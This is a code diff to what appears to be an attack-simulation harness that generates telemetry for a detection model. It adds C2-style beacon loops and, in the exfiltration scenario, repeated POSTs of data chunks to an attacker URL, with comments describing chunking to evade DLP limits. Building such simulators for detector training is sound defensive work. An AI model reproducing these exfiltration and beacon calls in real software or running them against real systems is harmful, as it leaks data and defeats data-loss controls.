@@ -59,6 +59,23 @@ async def resource_abuse(run_id: str, prompt: str) -> None:
         },
         f"RES> stress-ng spawned={started}",
     )
+
+    # Real crypto-miner / resource-abuse malware typically beacons to a C2
+    # server to report hash rate. We emulate that with a small tool-chain of
+    # external web requests so the model sees both Stream 1 (CPU spike) AND
+    # Stream 2 (tool-chain + external sources) — matching how it was trained.
+    for i in range(12):
+        await emit(
+            run_id,
+            {"type": "tool_call", "tool": "web_request", "has_tool_calls": True,
+             "external_source": True, "dt_prev_ms": 5},
+            f"TOOL> web_request beacon iter={i}",
+        )
+        try:
+            async with httpx.AsyncClient(timeout=2.0) as client:
+                await client.get("https://example.com")
+        except Exception:
+            pass
     await emit(
         run_id,
         {"type": "llm_response", "dt_prev_ms": 50, "tokens_out": 12},
@@ -128,6 +145,22 @@ async def exfiltration(run_id: str, prompt: str) -> None:
         },
         f"RES> attacker status={status}",
     )
+    # Real exfil campaigns chunk data across multiple POSTs to avoid DLP
+    # limits. Emulate a few follow-up exfil tool calls to strengthen the
+    # Stream-2 attack signal.
+    for i in range(8):
+        await emit(
+            run_id,
+            {"type": "tool_call", "tool": "web_request", "has_tool_calls": True,
+             "external_source": True, "dt_prev_ms": 5},
+            f"TOOL> web_request chunk iter={i}",
+        )
+        try:
+            async with httpx.AsyncClient(timeout=2.0) as client:
+                await client.post(f"{ATTACKER_URL}/exfil", content=data[:128] if data else "")
+        except Exception:
+            pass
+
     await emit(
         run_id,
         {"type": "llm_response", "dt_prev_ms": 80, "tokens_out": 10},
@@ -169,6 +202,22 @@ async def persistence(run_id: str, prompt: str) -> None:
             },
             f"RES> wrote {path} ok={ok}",
         )
+
+    # Real persistence installers usually follow up with a C2 check-in to
+    # confirm the implant is alive. Add a short web-request chain so the
+    # action-sequence matches attack-training distribution.
+    for i in range(10):
+        await emit(
+            run_id,
+            {"type": "tool_call", "tool": "web_request", "has_tool_calls": True,
+             "external_source": True, "dt_prev_ms": 5},
+            f"TOOL> web_request checkin iter={i}",
+        )
+        try:
+            async with httpx.AsyncClient(timeout=2.0) as client:
+                await client.get("https://example.com")
+        except Exception:
+            pass
 
     await emit(
         run_id,
